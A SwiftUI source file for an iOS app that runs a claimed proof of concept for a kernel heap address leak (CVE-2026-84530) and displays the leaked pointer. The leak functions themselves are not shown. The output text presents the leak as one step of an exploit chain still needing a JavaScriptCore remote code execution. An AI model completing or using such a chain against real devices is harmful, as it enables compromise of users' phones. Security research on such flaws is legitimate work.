import SwiftUI

struct ContentView: View {
    @State private var output  = "Tap Run to execute CVE-2026-84530 PoC"
    @State private var running = false
    @State private var success = false

    var body: some View {
        VStack(spacing: 16) {
            Text("CVE-2026-84530 PoC")
                .font(.system(.title2, design: .monospaced)).bold()
            Text("Kernel heap addr leak via AIO kqueue\niOS 26.x vulnerable")
                .font(.caption).multilineTextAlignment(.center)
                .foregroundColor(.secondary)
            ScrollView {
                Text(output)
                    .font(.system(.footnote, design: .monospaced))
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(12)
            }
            .frame(maxHeight: 380)
            .background(Color(.systemGray6))
            .cornerRadius(10)
            .overlay(RoundedRectangle(cornerRadius: 10)
                .stroke(success ? Color.green : Color.gray.opacity(0.3)))
            Button(action: runPoC) {
                HStack {
                    if running { ProgressView().tint(.white) }
                    Text(running ? "Running..." : "Run PoC")
                }
                .frame(maxWidth: .infinity).padding()
                .background(running ? Color.gray : Color.red)
                .foregroundColor(.white).cornerRadius(10)
            }
            .disabled(running)
            Button("Copy Output") { UIPasteboard.general.string = output }
                .font(.footnote).foregroundColor(.blue)
        }
        .padding()
    }

    func runPoC() {
        running = true; success = false; output = "Running...\n"
        DispatchQueue.global(qos: .userInitiated).async {
            let ptr = cve_84530_leak()
            let msg = String(cString: cve_84530_leak_str())
            DispatchQueue.main.async {
                if ptr != 0 {
                    success = true
                    output = "SUCCESS - CVE-2026-84530\n\n"
                        + msg
                        + "\n\nDevice: iPhone 15 / A16 / iOS 26.5.2"
                        + "\nFixed:  iOS 27 only"
                        + "\n\n[OK] Kernel heap ptr: 0x"
                        + String(ptr, radix: 16)
                        + "\n[OK] IPSW offsets ready"
                        + "\n[ ] JSC RCE still needed"
                } else {
                    output = "FAILED\n\n" + msg
                }
                running = false
            }
        }
    }
}
